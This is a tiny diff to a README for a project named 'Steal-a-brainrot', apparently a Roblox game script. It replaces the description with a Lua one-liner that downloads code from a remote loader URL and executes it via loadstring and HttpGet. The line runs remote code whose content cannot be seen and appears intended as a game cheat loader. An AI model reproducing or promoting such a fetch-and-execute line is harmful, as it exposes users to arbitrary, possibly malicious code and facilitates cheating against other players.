@@ -1,2 +1,2 @@
 # Steal-a-brainrot
-A great script to win og
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/228007939ebc976d2228d5cfc1391c69.lua"))()
